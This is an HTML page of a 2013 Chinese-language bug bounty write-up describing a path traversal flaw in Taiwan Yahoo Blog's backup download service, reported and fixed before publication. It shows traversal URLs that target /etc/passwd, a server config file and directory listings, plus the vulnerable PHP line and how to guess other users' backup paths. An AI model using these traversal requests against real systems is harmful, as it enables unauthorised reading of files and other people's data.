@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Yahoo 開始有了 Bug Bounty 制度! 緣起也滿有趣的，國外有個資安專家找到 Yahoo 的 XSS 漏洞結果回報後只得到 $12.50 Yahoo Company Store 優惠卷，結果當然超不爽的，只好 po 個 爆料文 XDDD 結果開始各界撻伐 Yahoo 事情越演越烈，Yahoo Security Team 的 Director 只好發文解釋（不負責任標題翻譯： 對，我就是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Yahoo Bug Bounty Part 1 - 台灣 Yahoo Blog 任意檔案下載漏洞 ">
+<meta property="og:url" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="Yahoo 開始有了 Bug Bounty 制度! 緣起也滿有趣的，國外有個資安專家找到 Yahoo 的 XSS 漏洞結果回報後只得到 $12.50 Yahoo Company Store 優惠卷，結果當然超不爽的，只好 po 個 爆料文 XDDD 結果開始各界撻伐 Yahoo 事情越演越烈，Yahoo Security Team 的 Director 只好發文解釋（不負責任標題翻譯： 對，我就是">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/5c91f7a53a616b40-01.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/cbb2ed8b420372ad-02.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/f066cea919415f91-03.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/cbb2ed8b420372ad-02.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/54f13ff09847b518-05.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/8f60056ff487fcce-06.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/295cb183bc62a5c6-07.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/016df9db36a9c427-08.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/318c0cb4e613f9ae-09.png">
+<meta property="article:published_time" content="2013-10-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-20T21:53:31.067Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/5c91f7a53a616b40-01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Yahoo Bug Bounty Part 1 - 台灣 Yahoo Blog 任意檔案下載漏洞  | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Yahoo Bug Bounty Part 1 - 台灣 Yahoo Blog 任意檔案下載漏洞 
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2013-10-31T16:00:00.000Z" class="dt-published" itemprop="datePublished">2013-11-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Yahoo 開始有了 <a target="_blank" rel="noopener" href="http://bugbounty.yahoo.com/">Bug Bounty</a> 制度! 緣起也滿有趣的，國外有個資安專家找到 Yahoo 的 XSS 漏洞結果回報後只得到 $12.50 <a target="_blank" rel="noopener" href="http://companystore.yahoo.com/">Yahoo Company Store</a> 優惠卷，結果當然超不爽的，只好 po 個 <a target="_blank" rel="noopener" href="https://www.htbridge.com/news/what_s_your_email_security_worth_12_dollars_and_50_cents_according_to_yahoo.html">爆料文</a> XDDD</p>
+<p>結果開始各界撻伐 Yahoo 事情越演越烈，Yahoo Security Team 的 Director 只好發文解釋<br>（不負責任標題翻譯： <a target="_blank" rel="noopener" href="http://yahoodevelopers.tumblr.com/post/62953984019/so-im-the-guy-who-sent-the-t-shirt-out-as-a-thank-you">對，我就是那個送你感謝潮Ｔ的人</a>）</p>
+<p>內文大意整件事件的始末，說明 Yahoo 並沒有完善的漏洞通報流程機制（商品卷還是自掏腰包買的），說明會改善這個機制，會有新的獎勵機制在 10&#x2F;31 公佈，並且新的機制可追溯到 7&#x2F;1 號後回報漏洞的人，並承諾會有 $150 - $15000 的 Reward（所以至少會有 150 美金耶＄＿＄）</p>
+<p>當初看到時覺得挺有趣的就找了幾個問題回報 Yahoo，Client Side 如 XSS 就算了，比較關注在 Server Side 上面的弱點（可以直接打進 Server 比較爽）</p>
+<p>主要回報流程是寄到 <a href="mailto:&#115;&#101;&#x63;&#x75;&#x72;&#105;&#116;&#x79;&#x40;&#121;&#97;&#104;&#111;&#x6f;&#45;&#105;&#x6e;&#x63;&#46;&#x63;&#x6f;&#x6d;">&#115;&#101;&#x63;&#x75;&#x72;&#105;&#116;&#x79;&#x40;&#121;&#97;&#104;&#111;&#x6f;&#45;&#105;&#x6e;&#x63;&#46;&#x63;&#x6f;&#x6d;</a> 這個信箱進行回報的動作（英文來來回回了好多信，英文苦手嗚嗚Ｔ＿Ｔ），經過回信確認且修補完成後來發個文章記錄一下細節!</p>
+<p>有找過兩個弱點，預計分成兩篇文章記錄一下攻擊思路跟細節</p>
+<p>第一篇是 台灣 Yahoo Blog 的任意檔案下載漏洞，第二篇是 <a target="_blank" rel="noopener" href="http://orange-tw.blogspot.tw/2013/11/yahoo-bug-bounty-part-2-loginyahoocom.html">*.login.yahoo.com Remote Code Execution 遠端代碼執行漏洞</a>。 </p>
+<p>其實兩個都不算少見的 Vulnerability，發現也不難，只是比起一般弱點，第一個需要細心以及一些經驗，第二個必須要瞭解漏洞原理並且改寫漏洞攻擊代碼</p>
+<h1 id="正文開始"><a href="#正文開始" class="headerlink" title="正文開始"></a>正文開始</h1><p>Yahoo Blog 以及無名小站將於今年關閉，官方提供了一個線上備份下載的服務，無名小站以及 Yahoo 部落格有著我國高中時期青春美好回憶，到底這樣的服務有沒有問題呢？ 讓我們繼續看下去!</p>
+<p>點擊備份，完成後會得到一個鏈結，<username> 是自己的使用者帳號，</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;tw.download.blog.yahoo.com&#x2F;eol&#x2F;user_start_download.php<br>?filename&#x3D;&lt;username&gt;-twblog.zip</p>
+</blockquote>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/5c91f7a53a616b40-01.png"></p>
+<p>點了可以下載（廢話）</p>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/cbb2ed8b420372ad-02.png"></p>
+<p>本著閒閒沒事找事做的心態，<code>&lt;username&gt;</code> 的部分改成別人的使用者名稱會成功嗎？</p>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/f066cea919415f91-03.png"></p>
+<p>登登，看起來失敗了 Ｔ＿＿Ｔ</p>
+<p>不過沒關係我們可以來研究研究，把網址改成</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;tw.download.blog.yahoo.com&#x2F;eol&#x2F;user_start_download.php<br>?filename&#x3D;.&#x2F;&lt;username&gt;-twblog.zip</p>
+</blockquote>
+<p>會怎麼樣呢？</p>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/cbb2ed8b420372ad-02.png"></p>
+<p>It works（感動Ｔ＿Ｔ）</p>
+<p>看起來是有東西可以玩玩，踹踹 passwd</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;tw.download.blog.yahoo.com&#x2F;eol&#x2F;user_start_download.php<br>?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
+</blockquote>
+<p>失敗Ｔ＿Ｔ 不過 &#x2F;tmp 下的檔案卻可以成功，</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;tw.download.blog.yahoo.com&#x2F;eol&#x2F;user_start_download.php<br>?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;.ICE-unix</p>
+</blockquote>
+<p>大致先猜想有 open_basedir 之類的限制，那換成一個逗點看看呢？</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;tw.download.blog.yahoo.com&#x2F;eol&#x2F;user_start_download.php<br>?filename&#x3D;.</p>
+</blockquote>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/54f13ff09847b518-05.png"></p>
+<p>檔名是 user_start_download.php<br>大小是 8.0 KB</p>
+<p>不過實際下載後，內容是空的，大致可以先猜想一下程式邏輯檔名部分先取得，最後再組裝路徑去讀取（或者發生某些錯誤），再把網址換成</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;tw.download.blog.yahoo.com&#x2F;eol&#x2F;user_start_download.php<br>?filename&#x3D;&#x2F;</p>
+</blockquote>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/8f60056ff487fcce-06.png"></p>
+<p>檔名變成了 <code>7fee0293d346458a97363c56378e68d5，</code>配合前面幾個測試，大致可以猜想程式的邏輯，檔案存放的路徑在</p>
+<blockquote>
+<p>&lt;user-hash&gt; &#x2F; &lt;username&gt; -twblog.zip</p>
+</blockquote>
+<p>不過似乎 zip 存放的地方與 webroot 不同，又有 open_basedir 的限制不能跳出來，不過如果我們可以猜到 web 路徑或是 web server 的設定檔路徑，還是有機會可以繼續玩下去的！</p>
+<p>經過一些猜測搜尋以及發揮你駭客的直覺！會發現設定檔在：</p>
+<blockquote>
+<p>&#x2F;home&#x2F;y&#x2F;conf&#x2F;yapache&#x2F;yapache.conf</p>
+</blockquote>
+<p>直接讀了啦！！！</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;tw.download.blog.yahoo.com&#x2F;eol&#x2F;user_start_download.php<br>?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;y&#x2F;conf&#x2F;yapache&#x2F;yapache.conf</p>
+</blockquote>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/295cb183bc62a5c6-07.png"></p>
+<p>BINGO ^____^ 由於 Server 又是 Unix 或是 bsd-like 的系統，所以可以直接讀取目錄</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;tw.download.blog.yahoo.com&#x2F;eol&#x2F;user_start_download.php<br>?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;y&#x2F;share&#x2F;htdocs&#x2F;intlblogs&#x2F;</p>
+</blockquote>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/016df9db36a9c427-08.png"></p>
+<p>最後就是讀 PHP 的 Source Code，來看一下程式邏輯到底是怎麼寫的？</p>
+<p><img src="/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/318c0cb4e613f9ae-09.png"></p>
+<p><code>$filename</code> 從 GET 取得，沒經過檢查就放入路徑</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$downloadFile</span> = <span class="variable">$downloadServer</span> .<span class="variable">$md5yuid</span>. <span class="string">&#x27;/&#x27;</span>. <span class="variable">$filename</span>;</span><br></pre></td></tr></table></figure>
+
+<p>最後再丟入 fopen 進行讀取的動作 ，<code>$md5yuid</code> 應該就是剛剛所說的 <code>&lt;user-hash&gt;</code>，產生方式是 <code>md5($yuid)</code></p>
+<p><code>$yuid</code> 雖然不明瞭如何產生，不過在進行備份的動作時可以看到自己送出去的 yuid，多看幾個賬號的 yuid 靠歸納法大致可以知道是</p>
+<blockquote>
+<p>&lt;username&gt;#&lt;2_bytes_random_char&gt;</p>
+</blockquote>
+<p>（ Ex: account#gy ）</p>
+<p>看懂的應該很好寫一個下載任意帳號備份的 Proof-of-Concept 吧XD</p>
+<p>到此結案收收寄信通報! 八卦是程式碼裡面有看到簡體字還有表情符號滿可愛的 XDD</p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
